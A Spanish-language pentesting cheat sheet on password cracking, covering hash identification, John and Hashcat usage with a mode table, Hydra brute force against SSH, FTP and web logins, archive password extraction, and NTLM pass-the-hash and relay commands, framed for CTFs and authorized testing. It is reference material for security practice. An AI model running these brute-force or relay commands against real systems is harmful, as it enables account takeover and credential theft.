# Cracking — hashes y credenciales

> Solo sobre hashes propios, de un CTF o con autorización escrita. Nunca contra
> servicios de terceros.

## Identificar el hash

```bash
hashid hash.txt
hash-identifier
```

## Diccionarios

```bash
ls /usr/share/wordlists/
# rockyou: /usr/share/wordlists/rockyou.txt (descomprimir si está .gz)

# Diccionario a medida desde el objetivo (CTF / autorizado)
cewl https://<host> -d 2 -m 5 -w work/palabras.txt

# Mutaciones
hashcat --stdout work/palabras.txt -r /usr/share/hashcat/rules/best64.rule > work/mutado.txt
```

## John

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --show
john --format=bcrypt hash.txt --wordlist=rockyou.txt
```

## Hashcat

| Tipo | Modo |
|---|---|
| MD5 | 0 |
| SHA-1 | 100 |
| SHA-256 | 1400 |
| bcrypt | 3200 |
| NTLM | 1000 |
| NetNTLMv2 | 5600 |
| Kerberoast (TGS) | 13100 |
| AS-REP | 18200 |
| JWT HS256 | 16500 |
| ZIP (ZipCrypto) | 17200 |

```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
hashcat -m 1000 -a 3 hashes.txt '?u?l?l?l?l?d?d?d?d'
hashcat -m 22000 handshake.hc22000 rockyou.txt      # WPA
```

## Fuerza bruta de servicios (solo autorizado)

```bash
hydra -l usuario -P work/palabras.txt ssh://<host>
hydra -L work/usuarios.txt -p 'Password1' ftp://<host>
hydra -l admin -P work/palabras.txt http-post-form \
  '/login:usuario=^USER^&clave=^PASS^:incorrectos'
```

Control obligatorio: `-t 4` como máximo sin autorización explícita, y parar al
primer éxito para no bloquear cuentas.

## Contraseñas de archivos

```bash
zip2john archivo.zip > h.txt && john h.txt --wordlist=rockyou.txt
7z2john archivo.7z > h.txt && john h.txt
rar2john archivo.rar > h.txt && john h.txt
office2john documento.docx > h.txt && john h.txt
pdf2john documento.pdf > h.txt && john h.txt
```

## Pass-the-hash / relay (solo laboratorio autorizado)

```bash
netexec smb <host> -u usuario -H <ntlm>
impacket-ntlmrelayx -tf targets.txt -smb2support
```

## Buenas prácticas

- Registrar tiempo y tasa de intentos: sirve para el informe.
- Preferir diccionario + reglas antes que fuerza bruta pura.
- Si el hash es de un servicio en producción, **detenerse** y pedir autorización
  específica por escrito.
